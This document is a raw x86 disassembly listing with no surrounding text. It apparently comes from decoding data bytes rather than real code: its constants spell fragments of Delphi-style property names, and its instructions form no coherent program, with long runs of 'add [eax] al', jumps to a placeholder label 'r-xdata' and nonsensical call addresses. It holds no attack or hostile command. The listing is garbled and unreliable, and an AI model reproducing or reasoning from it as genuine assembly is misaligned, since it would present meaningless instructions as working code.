dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
xchg ebx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
call 0xffffffffd8435f2d
add [ eax ] al
inc ebx
add [ eax ] cl
xchg ebx eax
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg edx eax
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
jo r-xdata
add [ eax + 0x4f0b002b ] al
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
push [ eax + 0x1004348 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ edi ] al
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
adc [ ecx ] eax
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
nop
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax ] ah
dec edx
jb r-xdata
jae r-xdata
adc [ ecx ] eax
js r-xdata
inc ebp
outsb
inc esp
jb r-xdata
adc [ ecx ] eax
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9421ae9
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
insb
inc ebx
insb
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add al ch
dec edx
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
xchg esp eax
cwde
inc esp
jb r-xdata
outsb
dec ebp
outsd
jne r-xdata
sub [ esi ] 0x0
or al 0x4f
outsd
ja r-xdata
inc esp
add bh bh
js r-xdata
inc ebp
outsb
dec esi
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add al cl
dec edx
inc ebx
add [ esp + ecx * 2 ] al
inc ebx
add al al
dec ebx
inc ebx
add [ eax + 0x3400434d ] cl
dec esp
inc ebx
add ah ah
dec ebx
inc ebx
add [ eax - 0x13ffbcb4 ] bl
dec esp
inc ebx
add [ eax ] cl
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
push eax
push ecx
inc ebx
add [ eax + 0xc004351 ] dl
push edx
inc ebx
add ah al
push ecx
inc ebx
add ah ch
push ecx
inc ebx
add [ eax + 0x52 ] cl
inc ebx
add [ eax - 0xbffbcae ] al
push eax
inc ebx
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc esp
add ah dh
dec edi
inc ebx
add [ ecx + ecx * 2 + 0x44 ] bh
add [ ebx + 0x44 ] bh
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ esi + ecx * 2 ] ah
inc ebx
add al ah
dec esi
inc ebx
add [ eax + 0x4f ] dl
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
inc ecx
add [ ebx + ebx * 4 + 0x4a200041 ] bh
pop esp
or [ eax + eax + 0x34 ] eax
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
enter 0x431c 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
jb r-xdata
jae r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
sbb eax 0x2200043
add [ eax ] al
fcomp [ esi - 0x6463ffbd ]
inc ecx
add ah ah
xor al 0x40
add al dh
dec esp
popad
jbe r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ 0x74617453 ] al
jpe r-xdata
je r-xdata
jb r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + ecx * 8 + 0x1c ] 0xa28c0043
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax - 0x1dffbce3 ] dh
les edx [ ebx + eax * 2 + 0x10000 ]
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
outsb
je r-xdata
jb r-xdata
push esp
dec edi
ja r-xdata
outsb
je r-xdata
andps xmm1 [ gs : edi + 0x77 ]
add eax 0x74617453
mov [ edx + 0x103c0043 ] fs
imul esp [ ebx + 0x61 ] 0x7373066c
insb
jae r-xdata
insb
jae r-xdata
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ eax ] bl
push ecx
inc ebx
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
jb r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
je r-xdata
push 0x6e490774
outsb
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
add al 0x52
inc eax
ja r-xdata
add [ esp + ebx * 4 - 0x2f4fffbf ] bh
inc ebx
add al dh
inc ebx
add [ eax + edx ] bh
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
insb
or dh [ ebx + 0x73 ]
push esi
inc ebx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add [ eax ] al
add [ esp + ebx * 4 ] al
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0x40 ] ch
add [ edx + 0x103c0043 ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
ror [ esi + ebx + 0xe080043 ] 0x54
inc esp
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x4b9cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + ecx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
inc esp
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
pushfd
inc ecx
add [ ecx + edx * 8 + 0x43 ] bl
add [ eax - 0x64 ] al
inc ecx
add ah dl
pushfd
inc ecx
add [ eax ] ch
popfd
inc ecx
add [ edi + ecx * 8 + 0x52c00043 ] bl
inc ebx
add [ eax ] dl
rol [ ebx ] 0x1
mov esp 0x840044a7
push es
inc esp
add [ eax + 0x440043d1 ] cl
rol [ ebx ] 0x1
or al 0xa8
inc esp
add [ eax ] ah
test al 0x44
add [ eax + edx * 8 + 0x43 ] bh
add [ eax - 0x58 ] cl
inc esp
add al bl
rol [ ebx ] 0x1
clc
push edx
inc ebx
add al bh
rol [ ebx ] 0x1
pop eax
test al 0x44
add [ esi + eax - 0x2e13ffbc ] cl
inc ebx
add [ edx + edx * 8 ] ch
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
insb
test al 0x44
add [ eax - 0x58 ] dh
inc esp
add [ ecx + edx * 8 ] bh
inc ebx
add [ esi + ecx * 8 + 0x54110043 ] ch
inc edx
jne r-xdata
add [ eax - 0xfffbc30 ] dh
jb r-xdata
add [ edx + esi + 0x40 ] al
add [ eax - 0x63ffbe64 ] cl
push edx
inc ebx
jb r-xdata
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x535c0041 ] bh
inc ebx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec ecx
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
mov eax eax
cld
push ds
inc ebx
add [ ebx + 0x431efcc0 ] cl
pop edi
inc eax
ja r-xdata
insb
push es
jae r-xdata
push ds
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x431fa0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx + 0x103c0043 ] fs
inc esp
add [ ebx + 0x497c0044 ] al
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
inc esp
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ ebx + edx * 2 + 0x43 ] bl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x207cc08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x43 ] cl
add [ esi + 0x21 ] ah
inc ebx
add [ edx + eax ] cl
add [ eax ] al
fcomp [ esi - 0x6463ffbd ]
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
add [ eax + 0x3000441c ] ch
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
jb r-xdata
je r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
add al 0x9c
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
je r-xdata
inc edx
outsd
je r-xdata
jb r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] bh
push ds
inc ebx
add [ esi ] al
add al ah
and al 0x44
add [ eax ] ch
je r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
mov al [ 0xffffffffec004354 ]
push esp
inc ebx
add [ eax - 0x7ffbcad ] dh
push ebx
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ eax ] bl
push ebp
inc ebx
add al dh
sbb al [ eax + eax + 0x20 ]
sbb [ eax + eax - 0x60 ] eax
push ds
inc esp
add [ esi + ebx + 0x1d5c0044 ] ah
cmp al 0x10
add [ eax ] al
sbb al 0x20
outsb
je r-xdata
insd
inc ebp
jbe r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
in al dx
outsb
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
dec eax
dec esp
push esi
inc ebx
add [ edi + edx * 2 ] bh
inc ebx
add al al
push edi
inc ebx
add [ eax + 0x40004356 ] bh
pop eax
inc ebx
add [ eax + ebx * 2 ] dl
inc ebx
add [ ebp + edx * 2 + 0x55d80043 ] dh
inc ebx
add [ edi ] al
push esp
inc edx
jne r-xdata
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add ah bl
push ebp
inc ebx
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x8 ] al
push ds
inc esp
add [ esi + edx * 2 + 0x43 ] ah
add al dh
sbb al [ eax + eax - 0x60 ]
push esi
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax 0x80004407
push esp
inc esp
outsd
insb
lea eax [ eax ]
jl r-xdata
add ah ch
inc eax
outsd
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
add dh bh
jo r-xdata
je r-xdata
je r-xdata
inc ebx
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x3 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push [ eax ]
outsb
mov eax eax
add al 0x23
inc ebx
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
inc ebx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x55500041 ] bh
insb
jae r-xdata
inc eax
inc ecx
add [ edx + eax ] bh
inc esp
add [ eax ] dh
je r-xdata
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ ecx + eax * 2 + 0x43529c00 ] bl
call 0xffffffffec435fc1
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
inc eax
adc [ ecx ] al
pop edi
add [ eax ] al
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
xor al 0x40
add [ ebp + 0x21f00040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax + 0x3000441c ] ch
outsb
inc ebx
outsd
outsb
je r-xdata
sub [ edx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
add bh bh
push esp
push es
inc esp
add [ ecx ] al
add [ eax + 0x4208000d ] al
outsb
[ ebx ] eax
js r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + 0x55 ] dl
cmp al 0x2
outsd
insb
jl r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
push [ eax ]
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
and al [ ebx ]
mul [ edx ]
inc ebx
add [ eax ] bl
add al [ eax ]
add [ eax ] dh
and [ ebx ] al
pushfd
fwait
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x23
inc ebx
add [ edx + 0xb0043 ] cl
or [ ebx + 0x74 ] dl
inc ebx
add [ eax ] dl
je r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
mov ah 0x8e
inc ebx
add [ ecx + 0x43 ] cl
add [ ecx + 0x43 ] bh
add [ ecx + eax + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
outsb
jae r-xdata
add [ eax ] al
adc [ eax ] 0x0
or eax [ ebx + 0x6f ]
xchg [ ebx ] eax
jpe r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add bh bh
jpe r-xdata
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x8f
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c0043d4 ]
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add ah cl
and eax 0x3c0041
add dh bh
rcl ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc [ eax - 0x1e ]
inc ebx
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
add [ eax + eax ] dl
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
xchg [ ebx ] eax
adc al 0x2
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
add bh bh
inc eax
loop r-xdata
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
scasd [ edi ]
inc ecx
add [ eax ] ch
mov es [ ebx ]
add bh bh
add al 0xe1
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
outsb
je r-xdata
insb
loopne r-xdata
jo r-xdata
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] eax
[ edx + eax ]
add ah bh
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
cmp al 0x55
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebx + ecx * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ eax + 0x43 ]
adc [ eax ] al
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001c ] al
push 0x6948776f
outsb
je r-xdata
dec ebx
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
mov [ bx + di ] dl
inc ecx
add al al
add [ eax ] eax
xchg ebx eax
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc esp
add [ ebx + ecx * 2 + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb eax 0x61540800
bound ecx [ edi + 0x72 ]
jb r-xdata
mov es [ ebx ]
add al 0x4b
adc [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx ] 0x0
add [ eax ] al
inc ebx
add [ ecx ] al
xlat
inc esp
add [ eax + eax ] bh
inc [ ecx ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ ecx ] eax
rol [ ecx ] 0x0
jo r-xdata
cmp bh 0xff
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
adc [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
sbb al 0x2
loopne r-xdata
jo r-xdata
nop
inc ebx
add al bl
cwde
xchg ecx eax
inc ebx
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
and al 0x0
or cl [ edi + 0x6e ]
adc [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax + 0x4f090025 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
add [ eax ] 0x0
xchg edx eax
inc ebx
add al ch
add [ eax ] al
je r-xdata
inc esp
jb r-xdata
xchg ecx eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
xchg esp eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
nop
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
jae r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
jns r-xdata
je r-xdata
inc ebx
add [ eax ] cl
outsd
jo r-xdata
adc al 0x2
add [ eax ] al
xor [ eax ] ah
inc ebx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
push ebp
jo r-xdata
xchg esp eax
inc ecx
add ah ch
